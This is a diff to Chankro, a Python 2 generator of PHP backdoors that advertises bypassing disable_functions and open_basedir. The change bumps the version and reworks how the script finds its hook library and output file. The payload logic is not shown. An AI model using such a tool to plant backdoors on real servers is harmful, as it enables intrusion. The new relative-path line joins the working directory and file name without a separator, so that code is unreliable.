@@ -1,4 +1,4 @@
-######## Chankro v0.3 #######
+######## Chankro v0.4 #######
 
 # [+] Bypass disable_functions
 # [+] Bypass open_basedir
@@ -10,6 +10,7 @@
 
 import argparse
 import base64
+import os
 
 parser = argparse.ArgumentParser(description='Generate PHP backdoor')
 parser.add_argument('--arch', dest='arch',help='Architecture (32 or 64)')
@@ -18,8 +19,8 @@ parser.add_argument('--output', dest='out', help='PHP filename')
 parser.add_argument('--path', dest='pati', help='Absolute path')
 args = parser.parse_args()
 
-
-
+# path where the tool is installed
+script_path = os.path.dirname(os.path.realpath(__file__))
 
 print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"
 
@@ -37,7 +38,10 @@ if not args.out:
 	print "[!] Error: please select a valid file as output"
 	exit()
 try:
-	outfile = open(args.out, "w")
+        if (os.path.isabs(args.out)):
+                outfile = open(args.out, "w") # absolute path provided
+        else:
+                outfile = open(os.getcwd() + args.out, "w") # relative path provided
 except:
 	print "[!] Error: file could not be created"
 	exit()
@@ -50,7 +54,7 @@ else:
 		print "[!] Error: unknow architecture"
 		exit()
 	else:
-		archi = "hook" + args.arch + ".so"
+		archi = script_path + "/hook" + args.arch + ".so"
 if not args.pati:
 	print "[!] Error: remote path"
 	exit()
